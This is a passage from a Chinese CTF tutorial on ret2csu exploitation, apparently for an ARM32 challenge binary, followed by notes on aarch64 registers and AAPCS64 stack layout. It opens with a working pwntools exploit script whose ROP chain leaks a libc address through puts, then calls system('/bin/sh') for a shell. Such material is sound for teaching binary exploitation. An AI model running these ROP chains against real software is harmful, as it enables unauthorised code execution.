<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>

<span class="n">sla</span><span class="p">(</span><span class="s1">'msg&gt; '</span><span class="p">,</span><span class="s1">'s1mpl3Dec0d4r'</span><span class="p">)</span>
<span class="n">r4</span> <span class="o">=</span> <span class="mh">0x00010cb0</span>
<span class="n">r3</span> <span class="o">=</span> <span class="mh">0x00010464</span>
<span class="n">movcall</span> <span class="o">=</span> <span class="mh">0x00010ca0</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">'puts'</span><span class="p">,</span><span class="n">puts_plt</span><span class="p">)</span>
<span class="n">ret_addr</span><span class="o">=</span><span class="mh">0x0010B60</span>

<span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x2c</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">r4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">r3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">movcall</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'comment&gt; '</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span>

<span class="n">libcbase</span> <span class="o">=</span> <span class="n">uu32</span><span class="p">(</span><span class="n">r</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">'libcbase'</span><span class="p">,</span><span class="n">libcbase</span><span class="p">)</span>

<span class="n">system</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">"/bin/sh</span><span class="se">\00</span><span class="s2">"</span><span class="p">))</span>

<span class="n">sla</span><span class="p">(</span><span class="s1">'msg&gt; '</span><span class="p">,</span><span class="s1">'s1mpl3Dec0d4r'</span><span class="p">)</span>

<span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">44</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">r4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">r3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">movcall</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'comment&gt; '</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h2 data-content="1" id="109c0334fcb8f68ae3f69baf43a79c10">aarch64架构下的ret2csu</h2>
<p>这里我主要是写一下与arm32位不同的地方</p>
<h3 data-content="1" id="350b53c3e0ce8f4f37e3ca0648a78a1e">寄存器</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200534-3aaa3634-2951-1.png"/></p>
<p>其实看一下寄存器就知道我们可以通过控制x29/fp，x30/LR这两个寄存器从而进行ret2csu打法</p>
<h3 data-content="1" id="b6cce5722e189d08926b7dab311fff8e">栈结构</h3>
<ol>
<li>
<p><strong>incoming stack arguments:</strong><br/>
即传入栈参数区域, 内部元素分配方向: 低地址 =&gt; 高地址。</p>
<p>严格来讲这段区域是caller分配的, 并不属于callee栈帧的一部分, 当caller调用callee时, callee 通过incoming 区域接收caller的参数。</p>
<p>对于caller来说这段区域称为outgoing stack argument(传出栈参数区域), 一个函数的 incoming 区域首地址等于其父函数的outgoing 区域的首地址。</p>
</li>
<li>
<p><strong>callee-allocated save area for register varargs:</strong><br/>
即匿名寄存器参数区域, 内部元素分配方向: 低地址 =&gt; 高地址。</p>
<p>对于可变参函数，此区域用来保存函数中可能用到的所有匿名寄存器参数，va_xxx系列函数的参数解析依赖于此区域。</p>
<p>从此区域开始(以及向低地址方向的内存)均为callee分配, 此区域按照高地址=&gt;低地址实际上分为GPRs/FPRs两个子区域; 每个区域内部元素分配方向均是低地址=&gt;高地址;</p>
</li>
<li>
<p><strong>local variables:</strong><br/>
即局部变量区域, 内部元素分配方向: 高地址 =&gt; 低地址。</p>
<p>函数中显示定义的变量，编译器内部生成的临时变量均存放在此区域中。</p>
<p>需要注意的是，编译优化可能导致变量分配顺序与源码中定义顺序不同，在不考虑优化的情况下其内部元素分配方向默认是高地址=&gt;低地址。</p>
</li>
<li>
<p><strong>callee-saved registers:</strong><br/>
即callee-saved寄存器区, 内部元素分配方向: 低地址 =&gt; 高地址。</p>
<p>在AAPCS64标准中[3]:</p>
</li>
</ol>
<p>[R19, R28] 是callee-saved registers, 这些寄存器在函数调用结束后要保持原始值，如果callee中修改了这些寄存器，则在返回前必须恢复其原始值。<br/>
LR(R30), FP(R29) 并非callee-saved寄存器, 但由于操作流程类似, 后续放在callee-saved寄存器中一并讨论。</p>
<ol>
<li>
<p><strong>dynamic allocation:</strong><br/>
即动态栈分配区, 内部元素分配方向: 高地址 =&gt; 低地址。</p>
<p>当函数中调用alloca时会在栈中dynamic allocation区域分配需内存，这部分区域在编译期间不存在, 在运行期间大小可以随执行变化。</p>
</li>
<li>
<p><strong>outgoing stack arguments:</strong><br/>
即栈参数传出区域, 内部元素分配方向: 低地址=&gt; 高地址;</p>
<p>当caller需要通过栈向子函数传递参数(如大于8个GPR参数)时, 栈参数保存在caller的outgoing区域。</p>
<p>一个函数(作为caller)其outgoing区域的大小是固定的，取决于其调用的callees中使用了最多栈参数的那个函数。当函数中存在动态分配时，其outging区域的首地址是可能动态变化的，但总是等于当前硬件寄存器sp的值, caller调用callee时也是通过此sp将其outgoing区域首地址传递给callee(作为callee的incoming区域首地址)。</p>
</li>
</ol>
<p><strong>函数调用栈结构：</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200542-3f5f2176-2951-1.png"/></p>
<h1 data-content="1" id="bb0e095019f6ecb65d6977cea5fa7987">参考</h1>
<p><a href="https://blog.csdn.net/lidan113lidan/article/details/123961152" target="_blank">(119条消息) AArch64函数栈的分配,指令生成与GCC实现(上)_aapcs64_ashimida@的博客-CSDN博客</a></p>
</div>
</div>